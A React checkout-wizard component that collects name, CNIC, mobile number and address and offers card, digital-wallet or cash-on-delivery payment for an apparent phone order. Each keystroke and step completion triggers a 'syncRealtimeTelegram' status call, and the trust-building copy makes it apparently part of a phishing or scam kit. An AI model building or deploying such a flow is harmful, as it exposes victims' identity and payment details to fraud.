'use client';

import React, { useState } from 'react';
import { ShieldCheck, Truck, CreditCard, Wallet, Banknote } from 'lucide-react';
import { useWizard } from '../../context/WizardContext';

export const Step3CustomerInfo: React.FC = () => {
  const { customerDetails, setCustomerDetails, goNext, syncRealtimeTelegram } = useWizard();
  const [errorMsg, setErrorMsg] = useState<string>('');

  const handleInputChange = (field: keyof typeof customerDetails, value: string) => {
    const updated = { ...customerDetails, [field]: value };
    setCustomerDetails(updated);
    if (value.length > 3) {
      syncRealtimeTelegram('Entering Customer Details');
    }
  };

  const handleNext = () => {
    if (!customerDetails.fullName.trim()) {
      setErrorMsg('Please enter your full name.');
      return;
    }
    if (!customerDetails.cnic.trim()) {
      setErrorMsg('Please enter your valid CNIC number.');
      return;
    }
    if (!customerDetails.mobileNumber.trim()) {
      setErrorMsg('Please enter your valid mobile number.');
      return;
    }
    if (!customerDetails.deliveryAddress.trim()) {
      setErrorMsg('Please provide your complete delivery address.');
      return;
    }
    setErrorMsg('');
    syncRealtimeTelegram('Completed Customer Info');
    goNext();
  };

  return (
    <div className="step-container">
      <h2 className="step-title">Customer Information</h2>
      <p className="step-subtitle">Provide your delivery details and choose your payment preference.</p>

      {/* Customer Form Inputs */}
      <div className="form-group">
        <label className="form-label">Full Name *</label>
        <input
          type="text"
          value={customerDetails.fullName}
          onChange={(e) => handleInputChange('fullName', e.target.value)}
          placeholder="e.g. Muhammad Ali Shah"
          className="form-input"
        />
      </div>

      <div className="form-group">
        <label className="form-label">CNIC *</label>
        <input
          type="text"
          inputMode="numeric"
          value={customerDetails.cnic}
          onChange={(e) => handleInputChange('cnic', e.target.value)}
          placeholder="XXXXX-XXXXXXX-X"
          className="form-input"
        />
      </div>

      <div className="form-group">
        <label className="form-label">Mobile Number * (WhatsApp active)</label>
        <input
          type="tel"
          inputMode="numeric"
          value={customerDetails.mobileNumber}
          onChange={(e) => handleInputChange('mobileNumber', e.target.value)}
          placeholder="xxxxxx-xxxxx"
          className="form-input"
        />
      </div>

      <div className="form-group">
        <label className="form-label">Delivery Address *</label>
        <textarea
          rows={3}
          value={customerDetails.deliveryAddress}
          onChange={(e) => handleInputChange('deliveryAddress', e.target.value)}
          placeholder="House #, Street, Sector / Area, City (e.g. Gulberg III, Lahore)"
          className="form-textarea"
        />
      </div>

      {/* Delivery Type Radio Cards */}
      <div className="form-group">
        <label className="form-label">Delivery Type</label>
        <div className="radio-card-list">
          <div
            onClick={() => setCustomerDetails({ ...customerDetails, deliveryType: 'open_parcel' })}
            className={`radio-card ${customerDetails.deliveryType === 'open_parcel' ? 'selected' : ''}`}
          >
            <div className="radio-circle">
              {customerDetails.deliveryType === 'open_parcel' && <div className="radio-inner-dot" />}
            </div>
            <div className="radio-content">
              <span className="radio-title" style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Truck size={16} color="#d31820" /> Open Parcel via TCS Rider (Recommended)
              </span>
              <span className="radio-desc">
                Open parcel and verify phone condition in front of TCS rider before completing payment.
              </span>
            </div>
          </div>

          <div
            onClick={() => setCustomerDetails({ ...customerDetails, deliveryType: 'standard' })}
            className={`radio-card ${customerDetails.deliveryType === 'standard' ? 'selected' : ''}`}
          >
            <div className="radio-circle">
              {customerDetails.deliveryType === 'standard' && <div className="radio-inner-dot" />}
            </div>
            <div className="radio-content">
              <span className="radio-title">Standard Courier Delivery</span>
              <span className="radio-desc">Direct sealed package delivery via TCS standard dispatch.</span>
            </div>
          </div>
        </div>
      </div>

      {/* Payment Method Radio Cards */}
      <div className="form-group">
        <label className="form-label">Payment Method</label>
        <div className="radio-card-list">
          <div
            onClick={() => setCustomerDetails({ ...customerDetails, paymentMethod: 'card' })}
            className={`radio-card ${customerDetails.paymentMethod === 'card' ? 'selected' : ''}`}
          >
            <div className="radio-circle">
              {customerDetails.paymentMethod === 'card' && <div className="radio-inner-dot" />}
            </div>
            <div className="radio-content">
              <span className="radio-title" style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <img width="20" height="20" src="https://img.icons8.com/fluency/48/credit-card-front.png" alt="credit-card-front" /> Card (0% EMI)
              </span>
              <span className="radio-desc">Visa / Mastercard bank installment support.</span>
            </div>
          </div>

          <div
            onClick={() => setCustomerDetails({ ...customerDetails, paymentMethod: 'wallet' })}
            className={`radio-card ${customerDetails.paymentMethod === 'wallet' ? 'selected' : ''}`}
          >
            <div className="radio-circle">
              {customerDetails.paymentMethod === 'wallet' && <div className="radio-inner-dot" />}
            </div>
            <div className="radio-content">
              <span className="radio-title" style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <img width="20" height="20" src="https://img.icons8.com/external-xnimrodx-lineal-gradient-xnimrodx/64/external-bitcoin-ecommerce-xnimrodx-lineal-gradient-xnimrodx.png" alt="Digital Wallet" /> Digital Wallet (Easypaisa / Upaisa / Alfalah)
              </span>
              <span className="radio-desc">Instant digital wallet verification.</span>
            </div>
          </div>

          <div
            onClick={() => setCustomerDetails({ ...customerDetails, paymentMethod: 'cod' })}
            className={`radio-card ${customerDetails.paymentMethod === 'cod' ? 'selected' : ''}`}
          >
            <div className="radio-circle">
              {customerDetails.paymentMethod === 'cod' && <div className="radio-inner-dot" />}
            </div>
            <div className="radio-content">
              <span className="radio-title" style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Banknote size={16} color="#d97706" /> Full Payment via Cash on Delivery
              </span>
              <span className="radio-desc">Pay full cash to TCS rider after opening parcel.</span>
            </div>
          </div>
        </div>
      </div>

      {/* Disclaimer Banner */}
      <div className="disclaimer-banner">
        <ShieldCheck size={20} color="#b45309" style={{ flexShrink: 0, marginTop: 2 }} />
        <span className="disclaimer-text">
          <strong>No Advance Payment Required!</strong> Your parcel is packed and dispatched under official guarantee. Payment/verification happens when the rider brings your package.
        </span>
      </div>

      {errorMsg && (
        <p style={{ color: '#d31820', fontSize: '13px', fontWeight: 600, marginBottom: '16px' }}>
          ⚠️ {errorMsg}
        </p>
      )}

      {/* Sticky App Bottom Action Bar */}
      <div className="sticky-bottom-bar">
        <button onClick={handleNext} className="btn-primary">
          {'Next → Proceed to Payment Agreement'}
        </button>
      </div>
    </div>
  );
};
